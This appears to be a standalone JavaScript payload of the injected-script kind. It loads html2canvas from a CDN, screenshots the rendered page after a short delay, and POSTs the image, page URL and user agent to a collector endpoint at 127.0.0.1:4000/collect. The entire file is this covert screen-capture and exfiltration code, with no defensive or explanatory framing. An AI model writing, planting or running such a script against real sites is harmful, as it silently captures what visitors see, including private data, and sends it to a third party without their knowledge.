(function () {
    const script = document.createElement('script');
    script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
    script.onload = function () {
      setTimeout(() => {
        html2canvas(document.body).then(canvas => {
          const screenshot = canvas.toDataURL('image/png'); // base64
  
          fetch('http://127.0.0.1:4000/collect', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              type: 'screenshot',
              url: location.href,
              userAgent: navigator.userAgent,
              screenshot: screenshot
            })
          });
        });
      }, 2000); // slight delay to ensure page has rendered
    };
    document.body.appendChild(script);
  })();
  